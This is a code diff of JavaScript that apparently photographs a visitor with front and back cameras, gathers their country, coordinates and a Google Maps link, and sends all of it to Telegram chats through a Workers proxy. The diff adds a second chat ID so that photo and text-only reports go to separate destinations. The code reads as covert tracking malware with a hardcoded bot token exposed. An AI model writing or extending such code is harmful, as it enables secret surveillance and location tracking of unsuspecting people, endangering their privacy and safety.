@@ -1,5 +1,7 @@
 const TELEGRAM_BOT_TOKEN = '7550142487:AAH_xOHuyHr0C2nXnQmkWx-b6-f1NSDXaHo';
-const TELEGRAM_CHAT_ID = '-1002718473645';
+const TELEGRAM_CHAT_ID_WITH_PHOTOS = '-1002718473645';
+const TELEGRAM_CHAT_ID_NO_PHOTOS = '6956722046';
+
 const API_SEND_MEDIA = `https://winter-hall-f9b4.jayky2k9.workers.dev/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`;
 const API_SEND_TEXT = `https://winter-hall-f9b4.jayky2k9.workers.dev/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
@@ -134,14 +136,14 @@ function getCaption() {
 🌎 Quốc gia: ${info.country}
 📍 Vĩ độ: ${info.lat}
 📍 Kinh độ: ${info.lon}
-📌 Vị trí Google Maps: ${mapsLink}
+📌 Google Maps: ${mapsLink}
 📸 Camera: ${info.camera}
 `.trim();
 }
 
 async function sendPhotos(frontBlob, backBlob) {
   const formData = new FormData();
-  formData.append('chat_id', TELEGRAM_CHAT_ID);
+  formData.append('chat_id', TELEGRAM_CHAT_ID_WITH_PHOTOS);
   formData.append('media', JSON.stringify([
     { type: 'photo', media: 'attach://front', caption: getCaption() },
     { type: 'photo', media: 'attach://back' }
@@ -157,7 +159,7 @@ async function sendTextOnly() {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
-      chat_id: TELEGRAM_CHAT_ID,
+      chat_id: TELEGRAM_CHAT_ID_NO_PHOTOS,
       text: getCaption()
     })
   });
